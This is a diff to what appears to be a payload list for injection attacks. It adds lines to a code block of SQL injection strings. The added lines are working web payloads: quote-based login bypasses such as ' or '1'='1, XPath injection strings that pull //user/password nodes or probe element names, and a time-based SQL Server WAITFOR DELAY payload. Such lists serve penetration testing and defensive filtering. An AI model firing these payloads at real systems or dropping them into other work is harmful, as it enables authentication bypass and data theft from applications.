@@ -114,6 +114,34 @@ admin") or "1"="1"/*
 %A8%27 OR 1=1;-- 2
 %8C%A8%27 OR 1=1-- 2
 %bf' or 1=1 -- --
+' or 1]%00
+' or '1'='1
+" or "1"="1
+' or ''='
+" or ""="
+') or 1=1 or ('
+') or 1=1] | //user/password[('')=('
+') or 2=1] | //user/node()[('')=('
+')] | //./node()[('')=('
+')] | //node()[('')=('
+') or 1=1] | //user/password[('')=('
+')] | //password%00
+')]/../*[3][text()!=('
+')] | //user/*[1] | a[('
+')] | //user/*[2] | a[('
+')] | //user/*[3] | a[('
+')] | //user/*[4] | a[('
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+'or string-length(name(.))<10 or'
+'or contains(name,'adm') or'
+'or contains(.,'adm') or'
+'or position()=2 or'
+admin' or '
+admin' or '1'='2
+','');WAITFOR%20DELAY%20'0:0:5'--%20-
 ```
 
 ```
